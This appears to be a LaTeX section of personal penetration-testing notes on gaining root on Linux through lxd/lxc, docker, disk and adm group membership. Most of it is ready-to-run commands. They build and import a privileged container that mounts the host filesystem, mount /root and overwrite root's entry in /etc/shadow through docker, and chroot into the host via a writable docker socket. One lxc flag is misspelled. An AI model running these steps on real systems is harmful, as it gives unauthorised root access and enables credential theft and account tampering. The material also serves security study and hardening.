
\section{Privileged Groups}

\subsection{lxd/lxc Group}
\subsubsection{Introduction}
If you belong to lxd or lxc group, you can become root

\subsubsection{Predator machine}

\begin{verbatim}
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
sudo go get -d -v github.com/lxc/distrobuilder
cd $HOME/go/src/github.com/lxc/distrobuilder
make
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
\end{verbatim}


\subsubsection{Prey machine}
transfer lxd.tar.gz and rootfs.squashfs on target


\begin{verbatim}
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list

lxc init alpine privesc -c security.priviled=true
lxc list
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
id
ls -l /mnt/root
\end{verbatim}

\subsubsection{links}
\begin{itemize}
    \item 
        \url{https://www.hackingarticles.in/lxd-privilege-escalation/}
    \item 
        \url{https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation}
\end{itemize}


\subsection{Docker}
\subsubsection{File system}
Placing a user in the docker group is essentially equivalent to root level
access to the file system without requiring a password. Members of the docker
group can spawn new docker containers. One example would be running the command
\begin{verbatim}
docker image ls

docker run -it \
    --volume /root:/mnt \
    --volume /etc/shadow:/tmp/shadow  \
    ubuntu 
    sh

echo "root:$(mkpasswd -m sha-512 foo foobarbaz):12345:0:::::" > /tmp/shadow

\end{verbatim} 

This command create a new Docker instance with the \verb+/root+ directory on
the host file system mounted as a volume. Once the container is started it is
possible to browse to the mounted directory and retrieve or add SSH keys for
the root user. This could be done for other directories such as \verb+/etc+
which could be used to retrieve the contents of the \verb+/etc/shadow+ file for
offline password cracking or adding a privileged user.

\subsubsection{Socket}
A case that can also occur is when the Docker socket is writable. Usually this socket is located in \verb+/var/run/docker.sock+. However, the location can understandably be different. Because basically, this can only be written by root or docker group. If we act as a user not in one of these two groups and the Docker socket still has the privileges to be writable, then we can still use this case to escalate our privileges.

\begin{verbatim}
$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
\end{verbatim}

\subsection{Disk}

Users within the disk group have full access to any devices contained within
i\verb+/dev+, such as \verb+/dev/sda1+, which is typically the main device used
by the operating system. An attacker with these privileges can use
\verb+debugfs+ to access the entire file system with \verb+root+ level
privileges. As with the Docker group example, this could be leveraged to
retrieve SSH keys, credentials or to add a user.


\subsection{ADM}
Members of the adm group are able to read all logs stored in \verb+/var/log+.
This does not directly grant root access, but could be leveraged to gather
sensitive data stored in log files or enumerate user actions and running cron
jobs.


